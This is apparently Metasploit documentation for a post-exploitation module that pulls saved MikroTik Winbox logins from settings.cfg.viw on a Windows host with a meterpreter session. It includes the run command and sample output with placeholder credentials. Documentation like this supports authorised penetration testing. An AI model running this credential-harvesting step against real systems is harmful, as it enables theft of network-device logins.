## Vulnerable Application

Any Windows host with a `meterpreter` session and Mikrotik Winbox installed.

Winbox can be downloaded [here](https://mikrotik.com/download)

### Installation Steps

1. Download and open Mikrotik Winbox
2. Enter a RouterOS device address into `Connect to`, username into `Login`, password into `Password` and check the flag `Keep Password`
3. Click Connect

## Verification Steps

1. Get a `meterpreter` session on a Windows host.
2. Do: `run post/windows/gather/credentials/winbox_settings`
3. If any users in the system has a `Keep Password` enabled in Winbox, the credentials will be printed out.

## Options

### VERBOSE

- By default verbose is turned off. When turned on, the module will show the HexDump of `settings.cfg.viw` files.

## Scenarios

```
msf6 post(windows/gather/credentials/winbox_settings) > run

[*] VERBOSE: false
[*] Checking Default Locations...
[*] C:\Users\Administrator\AppData\Roaming\Mikrotik\Winbox\settings.cfg.viw not found ....
[*] Found File at C:\Users\FooBar\AppData\Roaming\Mikrotik\Winbox\settings.cfg.viw
[+] Login: ThisIsUsername
[+] Password: ThisIsPassword
[*] Post module execution completed
```
